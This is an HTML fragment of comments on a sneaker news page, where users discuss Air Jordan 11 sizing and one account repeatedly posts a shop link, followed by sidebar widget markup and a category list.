  </div>
    
  <header class="fyre-comment-head">
    <a class="fyre-comment-username">NikeAirJordan</a> 
    
    
    <span class="fyre-comment-user-rating" style="display: none;">5pts</span>
    <span class="fyre-comment-like" style="float: right;">
      
    </span>
    
  </header>
  
  <section class="fyre-comment-body">
    <div class="fyre-comment">
      <p><p>shop.wisebuys23.com</p></p>
    </div>
    
  </section>

  <footer class="fyre-comment-footer">
  </footer>
  </div>
  <div class="fyre-comment-divider"><div class="fyre-comment-divider"></div></div>

  
    
  <div class="fyre-comment-replies fyre-comment-container fyre-comment-replies-indent">
  
  </div>
</article>


        
            
<article class="fyre-comment-article">
  <div class="fyre-comment-wrapper">
  
  
  
  <div class="fyre-comment-user">
    <a class="fyre-comment-author"><img src="https://secure.gravatar.com/avatar/1032cd41115475cd5dff5de5bcd81b10/?s=50&amp;d=https://lfavatar-a.akamaihd.net/a/anon/50.jpg" class=
    "fyre-user-avatar" alt="NikeAirJordan" /></a>

    <div class="fyre-comment-socialsync fyre-comment-from-livefyre"></div>
  </div>
    
  <header class="fyre-comment-head">
    <a class="fyre-comment-username">NikeAirJordan</a> 
    
    
    <span class="fyre-comment-user-rating" style="display: none;">5pts</span>
    <span class="fyre-comment-like" style="float: right;">
      
    </span>
    
  </header>
  
  <section class="fyre-comment-body">
    <div class="fyre-comment">
      <p><p><a vocab="http://schema.org" typeof="Person" rel="nofollow" resource="acct:_up69502542@livefyre.com" data-lf-handle="" data-lf-provider="livefyre" property="url" href="http://www.livefyre.com/profile/69502542/" target="_blank" class="fyre-mention fyre-mention-livefyre external">@<span property="name">hunterhcheyenne</span></a> Shop.WiseBuys23.com - </p></p>
    </div>
    
  </section>

  <footer class="fyre-comment-footer">
  </footer>
  </div>
  <div class="fyre-comment-divider"><div class="fyre-comment-divider"></div></div>

  
    
  <div class="fyre-comment-replies fyre-comment-container fyre-comment-replies-indent">
  
  </div>
</article>


        
            
<article class="fyre-comment-article">
  <div class="fyre-comment-wrapper">
  
  
  
  <div class="fyre-comment-user">
    <a class="fyre-comment-author"><img src="https://secure.gravatar.com/avatar/1032cd41115475cd5dff5de5bcd81b10/?s=50&amp;d=https://lfavatar-a.akamaihd.net/a/anon/50.jpg" class=
    "fyre-user-avatar" alt="NikeAirJordan" /></a>

    <div class="fyre-comment-socialsync fyre-comment-from-livefyre"></div>
  </div>
    
  <header class="fyre-comment-head">
    <a class="fyre-comment-username">NikeAirJordan</a> 
    
    
    <span class="fyre-comment-user-rating" style="display: none;">5pts</span>
    <span class="fyre-comment-like" style="float: right;">
      
    </span>
    
  </header>
  
  <section class="fyre-comment-body">
    <div class="fyre-comment">
      <p><p><a vocab="http://schema.org" typeof="Person" rel="nofollow" resource="acct:_up69502542@livefyre.com" data-lf-handle="" data-lf-provider="livefyre" property="url" href="http://www.livefyre.com/profile/69502542/" target="_blank" class="fyre-mention fyre-mention-livefyre external">@<span property="name">hunterhcheyenne</span></a> shop.wisebuys23.com</p></p>
    </div>
    
  </section>

  <footer class="fyre-comment-footer">
  </footer>
  </div>
  <div class="fyre-comment-divider"><div class="fyre-comment-divider"></div></div>

  
    
  <div class="fyre-comment-replies fyre-comment-container fyre-comment-replies-indent">
  
  </div>
</article>


        
            

        
            
<article class="fyre-comment-article">
  <div class="fyre-comment-wrapper">
  
  
  
  <div class="fyre-comment-user">
    <a class="fyre-comment-author"><img src="https://lfavatar-a.akamaihd.net/a/25/7836ee0c3cd162a000915f40bf754d52/50.jpg?v=1418194911" class=
    "fyre-user-avatar" alt="416Jamz" /></a>

    <div class="fyre-comment-socialsync fyre-comment-from-livefyre"></div>
  </div>
    
  <header class="fyre-comment-head">
    <a class="fyre-comment-username">416Jamz</a> 
    
    
    <span class="fyre-comment-user-rating" style="display: none;">5pts</span>
    <span class="fyre-comment-like" style="float: right;">
      
    </span>
    
  </header>
  
  <section class="fyre-comment-body">
    <div class="fyre-comment">
      <p><a vocab="http://schema.org" typeof="Person" rel="nofollow" resource="acct:108711203@twitter.com" data-lf-handle="" data-lf-provider="twitter" property="url" href="https://twitter.com/#!/jemxstones" target="_blank" class="fyre-mention fyre-mention-twitter external">@<span property="name">jemxstones</span></a> no prob</p>
    </div>
    
  </section>

  <footer class="fyre-comment-footer">
  </footer>
  </div>
  <div class="fyre-comment-divider"><div class="fyre-comment-divider"></div></div>

  
    
  <div class="fyre-comment-replies fyre-comment-container fyre-comment-replies-indent">
  
  </div>
</article>


        
            
<article class="fyre-comment-article">
  <div class="fyre-comment-wrapper">
  
  
  
  <div class="fyre-comment-user">
    <a class="fyre-comment-author"><img src="https://secure.gravatar.com/avatar/1032cd41115475cd5dff5de5bcd81b10/?s=50&amp;d=https://lfavatar-a.akamaihd.net/a/anon/50.jpg" class=
    "fyre-user-avatar" alt="NikeAirJordan" /></a>

    <div class="fyre-comment-socialsync fyre-comment-from-livefyre"></div>
  </div>
    
  <header class="fyre-comment-head">
    <a class="fyre-comment-username">NikeAirJordan</a> 
    
    
    <span class="fyre-comment-user-rating" style="display: none;">5pts</span>
    <span class="fyre-comment-like" style="float: right;">
      
    </span>
    
  </header>
  
  <section class="fyre-comment-body">
    <div class="fyre-comment">
      <p><p><a vocab="http://schema.org" typeof="Person" rel="nofollow" resource="acct:_up69392100@livefyre.com" data-lf-handle="" data-lf-provider="livefyre" property="url" href="http://www.livefyre.com/profile/69392100/" target="_blank" class="fyre-mention fyre-mention-livefyre external">@<span property="name">tayy11</span></a> shop.wisebuys23.com</p></p>
    </div>
    
  </section>

  <footer class="fyre-comment-footer">
  </footer>
  </div>
  <div class="fyre-comment-divider"><div class="fyre-comment-divider"></div></div>

  
    
  <div class="fyre-comment-replies fyre-comment-container fyre-comment-replies-indent">
  
  </div>
</article>


        
            
<article class="fyre-comment-article">
  <div class="fyre-comment-wrapper">
  
  
  
  <div class="fyre-comment-user">
    <a class="fyre-comment-author"><img src="https://lfavatar-a.akamaihd.net/a/25/d72c78572e35d3b847556157384d9f77/50.jpg?v=1417967014" class=
    "fyre-user-avatar" alt="stereochromo" /></a>

    <div class="fyre-comment-socialsync fyre-comment-from-livefyre"></div>
  </div>
    
  <header class="fyre-comment-head">
    <a class="fyre-comment-username">stereochromo</a> 
    
    
    <span class="fyre-comment-user-rating" style="display: none;">5pts</span>
    <span class="fyre-comment-like" style="float: right;">
      
    </span>
    
  </header>
  
  <section class="fyre-comment-body">
    <div class="fyre-comment">
      <p><a vocab="http://schema.org" typeof="Person" rel="nofollow" resource="acct:111970800@twitter.com" data-lf-handle="" data-lf-provider="twitter" property="url" href="https://twitter.com/#!/Veronifunk" target="_blank" class="fyre-mention fyre-mention-twitter external">@<span property="name">Veronifunk</span></a> <a vocab="http://schema.org" typeof="Person" rel="nofollow" resource="acct:16180874@twitter.com" data-lf-handle="" data-lf-provider="twitter" property="url" href="https://twitter.com/#!/SneakerNews" target="_blank" class="fyre-mention fyre-mention-twitter external">@<span property="name">SneakerNews</span></a> :p</p>
    </div>
    
  </section>

  <footer class="fyre-comment-footer">
  </footer>
  </div>
  <div class="fyre-comment-divider"><div class="fyre-comment-divider"></div></div>

  
    
  <div class="fyre-comment-replies fyre-comment-container fyre-comment-replies-indent">
  
  </div>
</article>


        
            
<article class="fyre-comment-article">
  <div class="fyre-comment-wrapper">
  
  
  
  <div class="fyre-comment-user">
    <a class="fyre-comment-author"><img src="https://lfavatar-a.akamaihd.net/a/25/07ad78251e877a629d9c2d6758c4d967/50.jpg?v=1417959875" class=
    "fyre-user-avatar" alt="neishneishh" /></a>

    <div class="fyre-comment-socialsync fyre-comment-from-livefyre"></div>
  </div>
    
  <header class="fyre-comment-head">
    <a class="fyre-comment-username">neishneishh</a> 
    
    
    <span class="fyre-comment-user-rating" style="display: none;">5pts</span>
    <span class="fyre-comment-like" style="float: right;">
      
    </span>
    
  </header>
  
  <section class="fyre-comment-body">
    <div class="fyre-comment">
      <p><a vocab="http://schema.org" typeof="Person" rel="nofollow" resource="acct:214964168@twitter.com" data-lf-handle="" data-lf-provider="twitter" property="url" href="https://twitter.com/#!/kickzNkush" target="_blank" class="fyre-mention fyre-mention-twitter external">@<span property="name">kickzNkush</span></a> <a vocab="http://schema.org" typeof="Person" rel="nofollow" resource="acct:16180874@twitter.com" data-lf-handle="" data-lf-provider="twitter" property="url" href="https://twitter.com/#!/SneakerNews" target="_blank" class="fyre-mention fyre-mention-twitter external">@<span property="name">SneakerNews</span></a> I have to do this one..lol</p>
    </div>
    
  </section>

  <footer class="fyre-comment-footer">
  </footer>
  </div>
  <div class="fyre-comment-divider"><div class="fyre-comment-divider"></div></div>

  
    
  <div class="fyre-comment-replies fyre-comment-container fyre-comment-replies-indent">
  
  </div>
</article>


        
            
<article class="fyre-comment-article">
  <div class="fyre-comment-wrapper">
  
  
  
  <div class="fyre-comment-user">
    <a class="fyre-comment-author"><img src="https://secure.gravatar.com/avatar/5f22675c16eaf81542d1a921b727bc88/?s=50&amp;d=https://lfavatar-a.akamaihd.net/a/anon/50.jpg" class=
    "fyre-user-avatar" alt="kshaun12" /></a>

    <div class="fyre-comment-socialsync fyre-comment-from-livefyre"></div>
  </div>
    
  <header class="fyre-comment-head">
    <a class="fyre-comment-username">kshaun12</a> 
    
    
    <span class="fyre-comment-user-rating" style="display: none;">5pts</span>
    <span class="fyre-comment-like" style="float: right;">
      
    </span>
    
  </header>
  
  <section class="fyre-comment-body">
    <div class="fyre-comment">
      <p><p><a vocab="http://schema.org" typeof="Person" rel="nofollow" resource="acct:_up69340034@livefyre.com" data-lf-handle="" data-lf-provider="livefyre" property="url" href="http://www.livefyre.com/profile/69340034/" target="_blank" class="fyre-mention fyre-mention-livefyre external">@<span property="name">mhamann23</span></a> did you get the right sizing? i dont have any 11s, but have been told they run a lil small... should usually get a .5 size up</p></p>
    </div>
    
  </section>

  <footer class="fyre-comment-footer">
  </footer>
  </div>
  <div class="fyre-comment-divider"><div class="fyre-comment-divider"></div></div>

  
    
  <div class="fyre-comment-replies fyre-comment-container fyre-comment-replies-indent">
  
  </div>
</article>


        
            
<article class="fyre-comment-article">
  <div class="fyre-comment-wrapper">
  
  
  
  <div class="fyre-comment-user">
    <a class="fyre-comment-author"><img src="https://secure.gravatar.com/avatar/9ac14329ee5f9e52ff294156aede2a73/?s=50&amp;d=https://lfavatar-a.akamaihd.net/a/anon/50.jpg" class=
    "fyre-user-avatar" alt="devyobey" /></a>

    <div class="fyre-comment-socialsync fyre-comment-from-livefyre"></div>
  </div>
    
  <header class="fyre-comment-head">
    <a class="fyre-comment-username">devyobey</a> 
    
    
    <span class="fyre-comment-user-rating" style="display: none;">5pts</span>
    <span class="fyre-comment-like" style="float: right;">
      
    </span>
    
  </header>
  
  <section class="fyre-comment-body">
    <div class="fyre-comment">
      <p><p>I'm going to try that pawn4bitcoin.com looks good.</p></p>
    </div>
    
  </section>

  <footer class="fyre-comment-footer">
  </footer>
  </div>
  <div class="fyre-comment-divider"><div class="fyre-comment-divider"></div></div>

  
    
  <div class="fyre-comment-replies fyre-comment-container fyre-comment-replies-indent">
  
  </div>
</article>


        
            
<article class="fyre-comment-article">
  <div class="fyre-comment-wrapper">
  
  
  
  <div class="fyre-comment-user">
    <a class="fyre-comment-author"><img src="https://secure.gravatar.com/avatar/71fc585835dec971c7902af8c072d500/?s=50&amp;d=https://lfavatar-a.akamaihd.net/a/anon/50.jpg" class=
    "fyre-user-avatar" alt="Aintyouashh" /></a>

    <div class="fyre-comment-socialsync fyre-comment-from-livefyre"></div>
  </div>
    
  <header class="fyre-comment-head">
    <a class="fyre-comment-username">Aintyouashh</a> 
    
    
    <span class="fyre-comment-user-rating" style="display: none;">5pts</span>
    <span class="fyre-comment-like" style="float: right;">
      
    </span>
    
  </header>
  
  <section class="fyre-comment-body">
    <div class="fyre-comment">
      <p><p>Ok thanks</p></p>
    </div>
    
  </section>

  <footer class="fyre-comment-footer">
  </footer>
  </div>
  <div class="fyre-comment-divider"><div class="fyre-comment-divider"></div></div>

  
    
  <div class="fyre-comment-replies fyre-comment-container fyre-comment-replies-indent">
  
  </div>
</article>


        
            
<article class="fyre-comment-article">
  <div class="fyre-comment-wrapper">
  
  
  
  <div class="fyre-comment-user">
    <a class="fyre-comment-author"><img src="https://lfavatar-a.akamaihd.net/a/1/2824c02b02df9ff88c85619837ec47ca/50.jpg?v=1375670433" class=
    "fyre-user-avatar" alt="dracyn" /></a>

    <div class="fyre-comment-socialsync fyre-comment-from-livefyre"></div>
  </div>
    
  <header class="fyre-comment-head">
    <a class="fyre-comment-username">dracyn</a> 
    
    
    <span class="fyre-comment-user-rating" style="display: none;">5pts</span>
    <span class="fyre-comment-like" style="float: right;">
      
    </span>
    
  </header>
  
  <section class="fyre-comment-body">
    <div class="fyre-comment">
      <p><p><a vocab="http://schema.org" typeof="Person" rel="nofollow" resource="acct:_up69659169@livefyre.com" data-lf-handle="" data-lf-provider="livefyre" property="url" href="http://www.livefyre.com/profile/69659169/" target="_blank" class="fyre-mention fyre-mention-livefyre external">@<span property="name">ileanbackk</span></a> Yep, Flight 23.</p></p>
    </div>
    
  </section>

  <footer class="fyre-comment-footer">
  </footer>
  </div>
  <div class="fyre-comment-divider"><div class="fyre-comment-divider"></div></div>

  
    
  <div class="fyre-comment-replies fyre-comment-container fyre-comment-replies-indent">
  
  </div>
</article>


        
            
<article class="fyre-comment-article">
  <div class="fyre-comment-wrapper">
  
  
  
  <div class="fyre-comment-user">
    <a class="fyre-comment-author"><img src="https://lfavatar-a.akamaihd.net/a/25/96fb107294e239a468efbdf9b37fbbd0/50.jpg?v=1415781215" class=
    "fyre-user-avatar" alt="kickzNkush" /></a>

    <div class="fyre-comment-socialsync fyre-comment-from-livefyre"></div>
  </div>
    
  <header class="fyre-comment-head">
    <a class="fyre-comment-username">kickzNkush</a> 
    
    
    <span class="fyre-comment-user-rating" style="display: none;">5pts</span>
    <span class="fyre-comment-like" style="float: right;">
      
    </span>
    
  </header>
  
  <section class="fyre-comment-body">
    <div class="fyre-comment">
      <p><a vocab="http://schema.org" typeof="Person" rel="nofollow" resource="acct:253218023@twitter.com" data-lf-handle="" data-lf-provider="twitter" property="url" href="https://twitter.com/#!/neishneishh" target="_blank" class="fyre-mention fyre-mention-twitter external">@<span property="name">neishneishh</span></a> <a vocab="http://schema.org" typeof="Person" rel="nofollow" resource="acct:16180874@twitter.com" data-lf-handle="" data-lf-provider="twitter" property="url" href="https://twitter.com/#!/SneakerNews" target="_blank" class="fyre-mention fyre-mention-twitter external">@<span property="name">SneakerNews</span></a> They're ill. Just a hassle to keep clean</p>
    </div>
    
  </section>

  <footer class="fyre-comment-footer">
  </footer>
  </div>
  <div class="fyre-comment-divider"><div class="fyre-comment-divider"></div></div>

  
    
  <div class="fyre-comment-replies fyre-comment-container fyre-comment-replies-indent">
  
  </div>
</article>


        
            
<article class="fyre-comment-article">
  <div class="fyre-comment-wrapper">
  
  
  
  <div class="fyre-comment-user">
    <a class="fyre-comment-author"><img src="https://lfavatar-a.akamaihd.net/a/1/33c052694e650ce61880aa561315bfb9/50.jpg?v=1419179774" class=
    "fyre-user-avatar" alt="slizick21" /></a>

    <div class="fyre-comment-socialsync fyre-comment-from-livefyre"></div>
  </div>
    
  <header class="fyre-comment-head">
    <a class="fyre-comment-username">slizick21</a> 
    
    
    <span class="fyre-comment-user-rating" style="display: none;">5pts</span>
    <span class="fyre-comment-like" style="float: right;">
      
    </span>
    
  </header>
  
  <section class="fyre-comment-body">
    <div class="fyre-comment">
      <p><p><a vocab="http://schema.org" typeof="Person" rel="nofollow" resource="acct:_up4932308@livefyre.com" data-lf-handle="" data-lf-provider="livefyre" property="url" href="http://www.livefyre.com/profile/4932308/" target="_blank" class="fyre-mention fyre-mention-livefyre external">@<span property="name">kshaun12</span></a> How sure are you that the 11's run a little small? Most Jordan shoe size for me is consistently 9.5 Can anyone that actually own a pair of 11's please confirm if this is true?</p></p>
    </div>
    
  </section>

  <footer class="fyre-comment-footer">
  </footer>
  </div>
  <div class="fyre-comment-divider"><div class="fyre-comment-divider"></div></div>

  
    
  <div class="fyre-comment-replies fyre-comment-container fyre-comment-replies-indent">
  
  </div>
</article>


        
            
<article class="fyre-comment-article">
  <div class="fyre-comment-wrapper">
  
  
  
  <div class="fyre-comment-user">
    <a class="fyre-comment-author"><img src="https://secure.gravatar.com/avatar/5f22675c16eaf81542d1a921b727bc88/?s=50&amp;d=https://lfavatar-a.akamaihd.net/a/anon/50.jpg" class=
    "fyre-user-avatar" alt="kshaun12" /></a>

    <div class="fyre-comment-socialsync fyre-comment-from-livefyre"></div>
  </div>
    
  <header class="fyre-comment-head">
    <a class="fyre-comment-username">kshaun12</a> 
    
    
    <span class="fyre-comment-user-rating" style="display: none;">5pts</span>
    <span class="fyre-comment-like" style="float: right;">
      
    </span>
    
  </header>
  
  <section class="fyre-comment-body">
    <div class="fyre-comment">
      <p><p><a vocab="http://schema.org" typeof="Person" rel="nofollow" resource="acct:_up61558473@livefyre.com" data-lf-handle="" data-lf-provider="livefyre" property="url" href="http://www.livefyre.com/profile/61558473/" target="_blank" class="fyre-mention fyre-mention-livefyre external">@<span property="name">slizick21</span></a> <a vocab="http://schema.org" typeof="Person" rel="nofollow" resource="acct:_up4932308@livefyre.com" data-lf-handle="" data-lf-provider="livefyre" property="url" href="http://www.livefyre.com/profile/4932308/" target="_blank" class="fyre-mention fyre-mention-livefyre external">@<span property="name">kshaun12</span></a> no disrespect ... but i wouldnt say that UNLESS somebody TOLD ME that... i mean isn't that common sense? </p><p>you can even google "jordan 11 sizing" and im sure you will find a forum where consistently some ppl are advising at going a .5, some even 1 size up  for better comfort due to the design of the sneaker...Jordan 11s have a smaller base at the back compared to other Jordans so going up half or a full size gives you more room so your foot is comfortable.... IE the reason <a vocab="http://schema.org" typeof="Person" rel="nofollow" resource="acct:_up69340034@livefyre.com" data-lf-handle="" data-lf-provider="livefyre" property="url" href="http://www.livefyre.com/profile/69340034/" target="_blank" class="fyre-mention fyre-mention-livefyre external">@<span property="name">mhamann23</span></a> said his gave him problems on his achilles!</p></p>
    </div>
    
  </section>

  <footer class="fyre-comment-footer">
  </footer>
  </div>
  <div class="fyre-comment-divider"><div class="fyre-comment-divider"></div></div>

  
    
  <div class="fyre-comment-replies fyre-comment-container fyre-comment-replies-indent">
  
  </div>
</article>


        
            
<article class="fyre-comment-article">
  <div class="fyre-comment-wrapper">
  
  
  
  <div class="fyre-comment-user">
    <a class="fyre-comment-author"><img src="https://lfavatar-a.akamaihd.net/a/1/33c052694e650ce61880aa561315bfb9/50.jpg?v=1419179774" class=
    "fyre-user-avatar" alt="slizick21" /></a>

    <div class="fyre-comment-socialsync fyre-comment-from-livefyre"></div>
  </div>
    
  <header class="fyre-comment-head">
    <a class="fyre-comment-username">slizick21</a> 
    
    
    <span class="fyre-comment-user-rating" style="display: none;">5pts</span>
    <span class="fyre-comment-like" style="float: right;">
      
    </span>
    
  </header>
  
  <section class="fyre-comment-body">
    <div class="fyre-comment">
      <p><p><a vocab="http://schema.org" typeof="Person" rel="nofollow" resource="acct:_up4932308@livefyre.com" data-lf-handle="" data-lf-provider="livefyre" property="url" href="http://www.livefyre.com/profile/4932308/" target="_blank" class="fyre-mention fyre-mention-livefyre external">@<span property="name">kshaun12</span></a> Sorry to offend you yo! I just really wanted to make sure before I get this shoe, I know that they have forums but I just wanted to get straight to the point without checking. Thanks for the update though.....</p></p>
    </div>
    
  </section>

  <footer class="fyre-comment-footer">
  </footer>
  </div>
  <div class="fyre-comment-divider"><div class="fyre-comment-divider"></div></div>

  
    
  <div class="fyre-comment-replies fyre-comment-container fyre-comment-replies-indent">
  
  </div>
</article>


        
            
<article class="fyre-comment-article">
  <div class="fyre-comment-wrapper">
  
  
  
  <div class="fyre-comment-user">
    <a class="fyre-comment-author"><img src="https://secure.gravatar.com/avatar/5f22675c16eaf81542d1a921b727bc88/?s=50&amp;d=https://lfavatar-a.akamaihd.net/a/anon/50.jpg" class=
    "fyre-user-avatar" alt="kshaun12" /></a>

    <div class="fyre-comment-socialsync fyre-comment-from-livefyre"></div>
  </div>
    
  <header class="fyre-comment-head">
    <a class="fyre-comment-username">kshaun12</a> 
    
    
    <span class="fyre-comment-user-rating" style="display: none;">5pts</span>
    <span class="fyre-comment-like" style="float: right;">
      
    </span>
    
  </header>
  
  <section class="fyre-comment-body">
    <div class="fyre-comment">
      <p><p><a vocab="http://schema.org" typeof="Person" rel="nofollow" resource="acct:_up61558473@livefyre.com" data-lf-handle="" data-lf-provider="livefyre" property="url" href="http://www.livefyre.com/profile/61558473/" target="_blank" class="fyre-mention fyre-mention-livefyre external">@<span property="name">slizick21</span></a> <a vocab="http://schema.org" typeof="Person" rel="nofollow" resource="acct:_up4932308@livefyre.com" data-lf-handle="" data-lf-provider="livefyre" property="url" href="http://www.livefyre.com/profile/4932308/" target="_blank" class="fyre-mention fyre-mention-livefyre external">@<span property="name">kshaun12</span></a> my bad bruh, i may have snapped just a bit, but yeah.. ima size 9 in most things, i prolly get a 9.5 for 11s i get</p></p>
    </div>
    
  </section>

  <footer class="fyre-comment-footer">
  </footer>
  </div>
  <div class="fyre-comment-divider"><div class="fyre-comment-divider"></div></div>

  
    
  <div class="fyre-comment-replies fyre-comment-container fyre-comment-replies-indent">
  
  </div>
</article>


        
            
<article class="fyre-comment-article">
  <div class="fyre-comment-wrapper">
  
  
  
  <div class="fyre-comment-user">
    <a class="fyre-comment-author"><img src="https://lfavatar-a.akamaihd.net/a/1/33c052694e650ce61880aa561315bfb9/50.jpg?v=1419179774" class=
    "fyre-user-avatar" alt="slizick21" /></a>

    <div class="fyre-comment-socialsync fyre-comment-from-livefyre"></div>
  </div>
    
  <header class="fyre-comment-head">
    <a class="fyre-comment-username">slizick21</a> 
    
    
    <span class="fyre-comment-user-rating" style="display: none;">5pts</span>
    <span class="fyre-comment-like" style="float: right;">
      
    </span>
    
  </header>
  
  <section class="fyre-comment-body">
    <div class="fyre-comment">
      <p><p><a vocab="http://schema.org" typeof="Person" rel="nofollow" resource="acct:_up4932308@livefyre.com" data-lf-handle="" data-lf-provider="livefyre" property="url" href="http://www.livefyre.com/profile/4932308/" target="_blank" class="fyre-mention fyre-mention-livefyre external">@<span property="name">kshaun12</span></a> Not a problem brotha! We all have our days, I know that you're a cool kat, so I really wasn't tripping. But I did go and check out some of the forums and most of the guys did indicate that they're true to size but some did say to go .5 size up with wider feet so I'm going a .5 size up. Thanks for the head up though! Or I probably would've been hating life with the foot ache! </p></p>
    </div>
    
  </section>

  <footer class="fyre-comment-footer">
  </footer>
  </div>
  <div class="fyre-comment-divider"><div class="fyre-comment-divider"></div></div>

  
    
  <div class="fyre-comment-replies fyre-comment-container fyre-comment-replies-indent">
  
  </div>
</article>


        
      </div>
    </div>
  </div>
</div>
</div></div>

                
                <!--side-bar-->
    <div class="right-main">
    <section class="right-data-con omc-right" id="omc-sidebar">
        <ul class="xoxo">
			<!-- cmnUNT | Begin ad tag -->
			<script type="text/javascript">cmnUNT('300x250', tile_num++);</script> 
			<!-- cmnUNT | End ad tag -->
			<br><br>
		

		<!--<li class="instagram omc-widget">
			
						
			<header class="hero">
				<h2><span class="logo"></span></h2>
				<a href="http://instagram.com/sneakernews" target="_blank" class="external"><span>@</span>sneakernews</a>
				<h2><span> Followers</span></h2>
			</header>
			
						
		</li>-->		   
		</ul><!-- /xoxo -->
    </section>

    <section class="right-data-con">
        <div class="follow-us-box">
            <h3><span>follow us:</span></h3>

            <ul class="social-link">
                <li><a class="facebook" href="https://www.facebook.com/sneakernews"></a></li>                <li><a class="instagram" href="http://instagram.com/sneakernews"></a></li>                <li><a class="twitter" href="https://twitter.com/sneakernews/"></a></li>                <li><a class="pinterest" href="http://pinterest.com/sneakernews/"></a></li>                <li><a class="google" href="https://plus.google.com/+sneakernews/about"></a></li>            </ul>
            <div id="fb-root"></div>
            <script>(function(d, s, id) {
                    var js, fjs = d.getElementsByTagName(s)[0];
                    if (d.getElementById(id))
                        return;
                    js = d.createElement(s);
                    js.id = id;
                    js.src = "//connect.facebook.net/en_US/sdk.js#xfbml=1&version=v2.0";
                    fjs.parentNode.insertBefore(js, fjs);
                }(document, 'script', 'facebook-jssdk'));</script>
            <div class="fb-like" data-href="https://www.facebook.com/sneakernews" data-layout="standard" data-action="like" data-show-faces="false" data-share="false" width="300px"></div>
        </div>
    </section>

    <section class="right-data-con top-categories">
        <!-- AVH Extended Categories version 3.6.7 | http://blog.avirtualhome.com/wordpress-plugins/ --><h3><span>Top Categories</span></h3><ul><div id='cat-drop'><select name='cat' id='cat' class='postform' >
	<option value='-1'>Select Category</option>
	<option class="level-0" value="24">Adidas&nbsp;&nbsp;(4,205)</option>
	<option class="level-0" value="20">Air Classic BW&nbsp;&nbsp;(208)</option>
	<option class="level-0" value="12">Air Jordan&nbsp;&nbsp;(10,480)</option>
	<option class="level-0" value="206">Air Jordan Force Fusion&nbsp;&nbsp;(235)</option>
	<option class="level-0" value="15">Air Max 1&nbsp;&nbsp;(1,194)</option>
	<option class="level-0" value="9">Air Max 360&nbsp;&nbsp;(86)</option>
	<option class="level-0" value="6">Air Max 90&nbsp;&nbsp;(1,260)</option>
	<option class="level-0" value="19">Air Max 95&nbsp;&nbsp;(525)</option>
	<option class="level-0" value="47">Air Max 97&nbsp;&nbsp;(172)</option>
	<option class="level-0" value="57">Air Max Light&nbsp;&nbsp;(150)</option>
	<option class="level-0" value="41">Air Stab&nbsp;&nbsp;(31)</option>
	<option class="level-0" value="68">Air Structure&nbsp;&nbsp;(79)</option>
	<option class="level-0" value="273">Air Yeezy&nbsp;&nbsp;(325)</option>
	<option class="level-0" value="44">Alife&nbsp;&nbsp;(108)</option>
	<option class="level-0" value="39">Asia Exclusive&nbsp;&nbsp;(495)</option>
	<option class="level-0" value="42">Asics&nbsp;&nbsp;(835)</option>
	<option class="level-0" value="27">Bape&nbsp;&nbsp;(85)</option>
	<option class="level-0" value="21">Basketball&nbsp;&nbsp;(8,058)</option>
	<option class="level-0" value="4">Blazer&nbsp;&nbsp;(959)</option>
	<option class="level-0" value="272">Celebrity Feet&nbsp;&nbsp;(1,864)</option>
	<option class="level-0" value="16">Clothing&nbsp;&nbsp;(350)</option>
	<option class="level-0" value="43">Collaboration&nbsp;&nbsp;(6,518)</option>
	<option class="level-0" value="271">Collections&nbsp;&nbsp;(226)</option>
	<option class="level-0" value="70">Converse&nbsp;&nbsp;(1,043)</option>
	<option class="level-0" value="25">Court Force&nbsp;&nbsp;(104)</option>
	<option class="level-0" value="285">Customs&nbsp;&nbsp;(1,281)</option>
	<option class="level-0" value="61">DC Shoes&nbsp;&nbsp;(67)</option>
	<option class="level-0" value="3">Dope Kicks&nbsp;&nbsp;(68)</option>
	<option class="level-0" value="11">Dunk&nbsp;&nbsp;(2,765)</option>
	<option class="level-0" value="283">Dwyane Wade&nbsp;&nbsp;(466)</option>
	<option class="level-0" value="205">eBay&nbsp;&nbsp;(2,867)</option>
	<option class="level-0" value="64">Europe Exclusive&nbsp;&nbsp;(343)</option>
	<option class="level-0" value="270">Events&nbsp;&nbsp;(1,071)</option>
	<option class="level-0" value="4625">Featured&nbsp;&nbsp;(2,420)</option>
	<option class="level-0" value="7337">Featured Stories&nbsp;&nbsp;(290)</option>
	<option class="level-0" value="50">Finishline&nbsp;&nbsp;(360)</option>
	<option class="level-0" value="48">Footscape&nbsp;&nbsp;(169)</option>
	<option class="level-0" value="35">Gear&nbsp;&nbsp;(138)</option>
	<option class="level-0" value="284">Giveaway&nbsp;&nbsp;(42)</option>
	<option class="level-0" value="287">Griffey&nbsp;&nbsp;(209)</option>
	<option class="level-0" value="207">House of Hoops&nbsp;&nbsp;(301)</option>
	<option class="level-0" value="34">Hybrid&nbsp;&nbsp;(1,360)</option>
	<option class="level-0" value="73">Hyperdunk&nbsp;&nbsp;(736)</option>
	<option class="level-0" value="29">Japanese Brands&nbsp;&nbsp;(537)</option>
	<option class="level-0" value="204">JD Sports&nbsp;&nbsp;(243)</option>
	<option class="level-0" value="1">Just Released&nbsp;&nbsp;(13,804)</option>
	<option class="level-0" value="282">Kevin Durant&nbsp;&nbsp;(1,450)</option>
	<option class="level-0" value="52">Kids&nbsp;&nbsp;(608)</option>
	<option class="level-0" value="209">Kobe&nbsp;&nbsp;(2,089)</option>
	<option class="level-0" value="1282">Kyrie Irving&nbsp;&nbsp;(30)</option>
	<option class="level-0" value="22">LeBron&nbsp;&nbsp;(3,326)</option>
	<option class="level-0" value="217">Lifestyle Sneakers&nbsp;&nbsp;(2,992)</option>
	<option class="level-0" value="28">New Balance&nbsp;&nbsp;(1,450)</option>
	<option class="level-0" value="63">Nike 6.0&nbsp;&nbsp;(114)</option>
	<option class="level-0" value="71">Nike ACG&nbsp;&nbsp;(493)</option>
	<option class="level-0" value="7">Nike Air Force 1s&nbsp;&nbsp;(2,914)</option>
	<option class="level-0" value="5">Nike Air Max&nbsp;&nbsp;(5,028)</option>
	<option class="level-0" value="288">Nike Air Penny&nbsp;&nbsp;(680)</option>
	<option class="level-0" value="90">Nike Boots&nbsp;&nbsp;(253)</option>
	<option class="level-0" value="3101">Nike Flyknit&nbsp;&nbsp;(428)</option>
	<option class="level-0" value="280">Nike Foamposite&nbsp;&nbsp;(1,339)</option>
	<option class="level-0" value="51">Nike Force&nbsp;&nbsp;(138)</option>
	<option class="level-0" value="208">Nike Free&nbsp;&nbsp;(815)</option>
	<option class="level-0" value="6974">Nike Huarache&nbsp;&nbsp;(352)</option>
	<option class="level-0" value="40">Nike iD&nbsp;&nbsp;(944)</option>
	<option class="level-0" value="286">Nike Lunar&nbsp;&nbsp;(1,111)</option>
	<option class="level-0" value="58">Nike Retro&nbsp;&nbsp;(3,529)</option>
